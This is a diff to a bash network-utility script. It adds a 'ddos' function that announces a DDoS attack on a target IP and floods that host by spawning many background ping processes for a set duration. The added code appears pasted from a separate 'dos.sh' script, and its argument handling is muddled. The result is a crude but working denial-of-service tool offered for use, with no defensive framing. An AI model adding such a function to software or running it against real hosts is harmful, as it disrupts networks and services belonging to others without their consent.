@@ -58,6 +58,42 @@ display_help() {
 }
 
 # Function to list network interfaces with IP addresses and MAC addresses
+ddos() {
+    local target_ip=$1
+    if [[ -z "$target_ip" ]]; then
+        echo "Usage: ddos [target_ip]"
+        echo "Example: ddos 192.168.1.100"
+        return
+    fi
+    echo "Launching DDoS attack on $target_ip..."
+ 
+host="$1"
+shift
+declare -i npings=50
+declare -i duration=5
+
+while getopts ":n:t:" opt
+do
+case $opt in
+n) let npings=$OPTARG;;
+t) let duration=$OPTARG;;
+\?) echo "Usage: source dos.sh host [-n npings] [-t duration]" >&2;;
+esac
+done
+ 
+
+for (( i=0; $i<$npings; i++ ))
+do
+ping "$host" > /dev/null &
+done
+
+
+sleep $duration
+killall ping
+
+
+unset opt i host npings duration
+}
 list_network_info() {
     printf '%10s %32s %32s\n' interface ipaddress macaddress
     printf '%s\n' '----------------------------------------------------------------------------'
